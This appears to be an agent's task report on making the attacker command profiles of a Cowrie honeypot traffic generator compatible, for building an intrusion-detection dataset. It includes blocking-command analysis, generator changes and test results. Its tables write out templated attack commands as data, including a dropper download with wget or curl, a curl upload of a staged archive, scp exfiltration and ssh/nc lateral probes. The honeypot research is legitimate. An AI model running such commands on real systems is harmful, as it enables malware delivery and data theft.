# Cowrie profile compatibility and generator observability for Dataset V2

**Date:** 2026-11-10. **Task 8.**

**Not done:** no dataset was generated, no Cowrie session was run, and Cowrie and Docker are unchanged. Cowrie's source was **read** inside the running container, read-only. No TTY use, no model or extractor change, no change to the 13 model features, no commits.

**Labels:** [C] confirmed (code, data or test), [U] unverified, [Rec] recommendation.

## Evidence in this folder

| Path | Content |
|---|---|
| `historical_next_line.py`, `evidence/historical_next_line.json` | For each command name in the historical live runs (train_v1, eval_v1: same pinned Cowrie build, before isolation, timer-based generator 2.0), how often the next planned line reached Cowrie |
| `make_compat_profiles.py` | Derives `dataset_builder/profiles_v2_compat.json` from the unchanged `profiles_v2_isolated.json`, asserting each replacement |

**Cowrie source references** are to `/cowrie/cowrie-git/src/cowrie/commands/*.py` in image `cowrie/cowrie@sha256:bf371c37…` (Cowrie 2.9.17.dev1+gcd0770d3d, Twisted 25.5.0).

## 1. Profile compatibility audit (`dataset_builder/profiles_v2_isolated.json`)

### Blocking and abnormal commands

| Command (profile) | Cowrie implementation | Smoke test (task 7) | Historical next-line rate | Finding | Treatment in `profiles_v2_compat.json` |
|---|---|---|---|---|---|
| `ssh root@{lan_ip}`, `ssh -o StrictHostKeyChecking=no admin@{lan_ip}` (lateral_movement) | `ssh.py`: interactive yes/no and password prompts (`yesno`, `password_input`, `lineReceived`) [C] | 2/2 sessions timed out | 0/148 | **Blocks** (waits for input) | **Removed.** Step replaced by `cat ~/.ssh/config` / `ls -la ~/.ssh` (configuration inspection, not a substitute for a connection attempt) |
| `scp {dir}/d.tar root@{lan_ip}:/tmp/` (data_exfiltration) | `scp.py`: writes NUL bytes, then every input line becomes file data (`lineReceived` → `file_download realm=scp`); never exits on its own [C] | timed out | 0/32 | **Blocks** | **Removed** (the curl upload alternative remains) |
| `wget http://{ip}/{bin}` (botnet) | `wget.py` `error()`: after DNS/Cancelled/CommandFailed/ConnectingCancelled checks it evaluates `error.ConnectingDone`, **which does not exist in Twisted 25.5** (`hasattr` = False) → `AttributeError` inside the errback, before `exit()`. The "unreachable" failure of the isolated lab reaches that line [C, code]. Consistent with the smoke test: a `file_download.failed` event and no branch message in Cowrie's log | timed out | 2/122 | **Blocks in the isolated lab** (a Cowrie bug) | **Target changed to `{domain}`.** A `.example` name fails DNS resolution, which `error()` handles first, writing a message and calling `exit()` [C, code; live check pending] |
| `curl -O http://{domain}/{bin}` (botnet) | `curl.py` `error()` handles DNSLookupError, ConnectingCancelled, ConnectionRefused [C] | returned (0.09 s) | 76/157 (pre-isolation, cascade) | Returns | Unchanged |
| `curl -T {dir}/d.tgz http://{ip}/u` (data_exfiltration) | as above | returned (0.05 s) | — | Returns | Unchanged; now the only exfiltration-transfer alternative |
| `ping -c 2 {lan_ip}` (lateral_movement) | `ping.py` parses options with `getopt.gnu_getopt(args, "ci:")`: **`-c` takes no argument**, so `-c 2` gives count `''` → "ping: bad number of packets to transmit." and immediate exit [C, reproduced with Cowrie's Python: `([('-c', '')], ['2', '192.0.2.5'])`]. Without `-c` the count is 0 and ping never stops (it would block) | prompt after **0.047 s** | 95/95 | Returns immediately **with an error message**. This explains the smoke test's "suspicious" prompt: it was **not a prompt false positive** | Unchanged (a credible attacker command; its failure is Cowrie's and is not hidden). A count-less `ping` must never be added |
| `nc -zv {lan_ip} 22` (lateral_movement) | `nc.py`: real socket connect from Cowrie. In the lab it fails (`OSError`), Cowrie prints "Connection refused" for any `OSError`, and every branch calls `exit()` [C, code] | not run | 92/92 | Returns. **Makes a real connection attempt** (blocked by isolation); misleading message | Unchanged; flagged |
| `sudo -l` (privilege_escalation) | `sudo.py`: `-l` is declared to take an argument → `GetoptError` → `short_help()` → `exit()` [C] | not run | next line 259/259 | Returns, with a usage message (not real privilege output) | Unchanged; flagged |

### Other commands (all return a prompt)

- **Implemented by Cowrie:** `uptime`, `w`, `who`, `du`, `free`, `cat`, `tail`, `date`, `pwd`, `ls`, `whoami`, `id`, `uname`, `hostname`, `ps`, `ifconfig`, `find`, `tar`, `crontab`, `service`, `chmod`, `rm`, `cd`, `echo`, `history`, `unset`, `sh`.
- **Served as static output (txtcmds):** `df`, `lscpu`, `nproc`, `clear`, `enable`.
- **Not implemented ("command not found"):** `systemctl`, `journalctl`, `ss`, `ip`, `arp`, `nmap`, `system`, `shell`, `./{bin}`.

All of these returned in the smoke test or had a 100% historical next-line rate. The low historical rates for `chmod`, `./{bin}`, `sh`, `rm`, `nmap` and `hostname` are a **cascade**: under timer-based sending, every line after a blocking `wget`/`ssh` was lost. Prompt-gated sending removes this.

### Network-dependent and lab-dependent commands

| Command | In the isolated lab | In an Internet-facing deployment |
|---|---|---|
| `wget`, `curl` | Always fail | May succeed |
| `nc` | Makes a real outbound socket attempt, which fails | The attempt is real |
| `ssh`, `scp`, `ping` | Fully emulated; no network use | Same |

**Profile-specific session duration risk:** before compatibility, terminated sessions added ≈ 20 s (smoke test). After it, the remaining duration differences come from the number of commands, which is profile behaviour. The leakage checks must still confirm that (C3).

## 2. Blocking-command analysis

There are three independent causes, all inside Cowrie's emulation:

1. **Interactive emulations** (`ssh`) and **stdin-consuming emulations** (`scp`) wait for input the generator never sends.
2. **A Cowrie bug** (`wget.py` refers to a non-existent Twisted exception) leaves `wget` hanging after network-level failures. These failures happen only because the lab blocks egress.
3. **A Cowrie option-parsing bug** (`ping.py` `"ci:"`) makes `ping -c N` exit at once with an error. This is non-blocking, but not realistic output.

## 3. Proposed and implemented replacements

**New file:** `dataset_builder/profiles_v2_compat.json` (version `2.2.0-compat`, SHA-256 `27c4f964…dfb23`).

- It records `derived_from: profiles_v2_isolated.json 2.1.0-docnet`, a revised description, and `compat_notes` on each changed profile.
- Generated by `make_compat_profiles.py`, which asserts that each replaced step matches exactly once.
- `profiles_v2.json`, `profiles_v2_isolated.json` and both `configs/attack_profiles*.json` are **unchanged** (hash-pinned in a test).

| Profile | Change | What is preserved | What is lost (documented, not hidden) |
|---|---|---|---|
| botnet | `wget http://{ip}/{bin}` → `wget http://{domain}/{bin}` | A wget dropper download is still recorded; the chmod/execute/cleanup chain is unchanged | Nothing new; downloads already failed in the isolated lab. Execution of a missing file still prints Cowrie's error |
| data_exfiltration | `scp` alternative removed | Staging (`find`, `du`, `tar`) and a `curl -T` upload attempt (p = 0.8) | SCP as an exfiltration channel. The step has no alternative now, so less command variety |
| lateral_movement | Both `ssh` forms replaced by `cat ~/.ssh/config` / `ls -la ~/.ssh` (p = 0.6) | Discovery (`ip route`/`arp`/`/etc/hosts`), credential hunting (`known_hosts`, `bash_history`, `~/.ssh`), reachability probing (`ping`, `nc -zv`), `nmap` | **Actual pivot or connection attempts.** V2 `lateral_movement` represents *lateral reconnaissance only*. A credible login attempt cannot be represented in this Cowrie without interactive answering, which is not implemented |

**Unchanged profiles:** benign_admin, reconnaissance, brute_force and privilege_escalation contain no blocking command.

**Generator default:** `--config` still defaults to `profiles_v2.json`, and **V2 runs must pass `--config dataset_builder/profiles_v2_compat.json`** [Rec].

## 4. Terminal-output observability (implemented)

**`dataset_builder/generate_labelled_traffic.py`:**

- **`wait_for_prompt`** captures the output of each wait with `_OutputCapture`:
  - control sequences and CR removed;
  - head and tail halves of `OUTPUT_CAPTURE_CHARS = 2048`, with a truncation marker;
  - character and byte totals and `output_truncated`;
  - session passwords of ≥ `REDACT_MIN_LENGTH = 4` characters replaced with `[REDACTED]`, without exceeding the bound.

  It also returns `readiness_reason` and the exact `prompt_match`.
- **`run_session`** stores one diagnostic record per wait (`initial` and each command).
  - `main()` writes them to **`terminal_output.jsonl`**, never to the manifest.
  - The manifest's `command_log` gains only non-content fields: `readiness_reason`, `prompt_match`, `output_chars`, `output_truncated`.
  - `run_meta.json` records the file name and bounds.
- **Feature isolation:** `configs/feature_spec_v2.json` → `forbidden_inputs` now names the terminal output and per-command manifest fields. A test checks that the builder, labelling, relabelling, parser and V1 extractor never reference them.
- **The prompt heuristic is unchanged:** the code reading found no evidence of a false positive.
- **Manifest semantics are preserved:** `commands_sent`, `command_log` statuses and every earlier field mean the same, and labelling tests pass unchanged.

## 5. Pacing-seed policy (implemented)

- **`--pacing-seed` is required** (argparse rejects a missing seed). The old fallbacks (`--seed`, or a random seed) are gone.
- **Reuse check:** before any connection or output, `find_pacing_seed_reuse` scans every `run_meta.json` under `--runs-root` (default: the parent of `--output-dir`) and **refuses a seed already used**. `--allow-pacing-seed-reuse` exists for diagnostics only, and is recorded in `run_meta.pacing_seed_reuse`.
  - Run against the existing smoke-test runs, the scanner correctly reports all five runs that shared pacing seed 1.
- **Independence:** per-session streams (`pacing:<seed>:<index>`) are kept, and planning (`--seed`) stays independent of pacing. The two seeds are documented in `docs/generator_pacing_and_sequencing.md`.
- **Requirement:** all V2 runs live under one runs root so the check sees them [Rec].

## 6. Specification amendment (draft.3)

`configs/feature_spec_v2.json` → `2.0.0-draft.3`:

- new provenance class `file_event_network_download_failed` (`cowrie.session.file_download.failed`: an attempted URL, no file);
- new descriptive field `download_failed_events`;
- `url_download_events` clarified as successful downloads only, separate from failed attempts and local redirect writes;
- forbidden inputs extended.

**No model feature, status or conditional group changed** (programmatic comparison with draft.2). `docs/feature_specification_v2.md` and `reports/common_feature_specification_v2/report.md` (Amendment A2) were updated.

## 7. Test results

**New tests (25):**

- `tests/test_profile_compatibility.py` (13):
  - original and isolated profiles unchanged (hashes);
  - compat differs from isolated only in the three documented steps (labels, categories, credentials and held-out status untouched);
  - the isolated profiles contain the blocking commands and compat contains none;
  - every IP is in a documentation range and every URL host is `.example` or a documentation IP, with `wget` only to `.example`;
  - **all 7 compat profiles complete (`clean_exit`, all planned commands sent) over 40 planned sessions each**, under a Cowrie behaviour model built from this audit (`ssh`/`scp` hang, `wget`-to-IP hangs);
  - the isolated lateral profile terminates under the same model.
- `tests/test_generator_observability.py` (12):
  - prompt evidence traceable (`prompt_match` appears in the output);
  - a timeout records the observed output and no prompt;
  - truncation at the limit;
  - password redaction;
  - short-secret and bound handling;
  - capture-class counts;
  - `terminal_output.jsonl` is separate, with one record per wait, and the manifest contains no output;
  - no feature or label code reads it, and the specification still has 13 model features;
  - `--pacing-seed` required;
  - seed recorded and independent of `--seed`;
  - reuse refused before any output;
  - override recorded.

**Updated:** `tests/test_generator_pacing.py` (passes `--pacing-seed`), and `tests/generator_fakes.py` (line-based behaviours and a large-output behaviour).

**A defect found and fixed during testing:** redaction ran after the length bound, so a 1-character password expanded the output to 20,202 characters. Redaction now runs per half, short secrets are skipped, and the bound is re-applied.

**Full suite: 233 passed** (previously 208), 5 warnings, the same as before.

## 8. Remaining profile-specific risks

1. **lateral_movement lost its defining action** (connection attempts). V2 can only claim *lateral reconnaissance*.
2. **data_exfiltration:** a single transfer alternative (`curl -T`), and it is a held-out profile.
3. **Download and exfiltration attempts all fail in the lab.** `file_download.failed` events appear for wget/curl, and `tty_output_bytes` includes Cowrie's error text. This is lab-specific.
4. **Emulation artefacts remain visible in output:** `ping` and `sudo -l` print errors or usage text instead of realistic output, which affects `tty_output_bytes` (core feature) for lateral_movement and privilege_escalation. The commands themselves are recorded faithfully.
5. **`nc -zv` makes a real (blocked) socket attempt** from Cowrie. In a non-isolated deployment it would reach the network.
6. **Duration and command-count differences between profiles remain:** profiles have different step counts. That is behaviour, but conditional groups C2/C3 and leakage checks L1/L2/L6 must evaluate it on the generated training data.
7. **The `wget` → `{domain}` fix is supported by code, not yet observed live** [U]. In the smoke test `curl` to a `.example` name returned, and `wget` takes the same DNS-failure path in code.

## 9. Is another real-Cowrie smoke test required?

**Yes, before Dataset V2.** It is needed to confirm against the real honeypot:

- that `wget http://<name>.example/…` returns a prompt (the code-based claim);
- that the replacement lateral steps return;
- that terminal capture works with Cowrie's real output (and shows the `ping` and `sudo` messages);
- that `terminal_output.jsonl` and the new manifest fields are written correctly;
- that all compat profiles complete without timeouts.

**Proposed scope:** the 7 compat profiles × 2 sessions, `--config dataset_builder/profiles_v2_compat.json`, new pacing seeds, and the same isolation checks and baseline procedure as task 7. **It needs your approval.**

## 10. Recommendation on Dataset V2 readiness

**Not yet ready; one approved smoke test away.**

- **What is in place:**
  - the compat profiles remove every blocking command identified;
  - readiness decisions are now auditable;
  - pacing seeds are enforced;
  - the specification covers failed downloads.
- **Before generation:**
  - (1) the confirmation smoke test above;
  - (2) acceptance of the documented semantic loss for `lateral_movement` (reconnaissance only) and `data_exfiltration` (curl upload only);
  - (3) agreement that Cowrie's emulation errors (`ping`, `sudo`, failed downloads) remain visible in output-based features.

## 11. Files

- **Modified:**
  - `dataset_builder/generate_labelled_traffic.py`
  - `configs/feature_spec_v2.json`
  - `docs/feature_specification_v2.md`
  - `docs/generator_pacing_and_sequencing.md`
  - `docs/generation_manifest_schema.md`
  - `reports/common_feature_specification_v2/report.md` (Amendment A2)
  - `tests/test_generator_pacing.py`
  - `tests/generator_fakes.py`
- **Created:**
  - `dataset_builder/profiles_v2_compat.json`
  - `tests/test_profile_compatibility.py`
  - `tests/test_generator_observability.py`
  - this folder (report, `make_compat_profiles.py`, `historical_next_line.py`, `evidence/`)
- **Unchanged:** profile files `profiles_v2.json`, `profiles_v2_isolated.json`, `configs/attack_profiles*.json`; datasets, models, extractors, parser, builder, labelling, and Cowrie and Docker configuration. `test_touches` = 0.
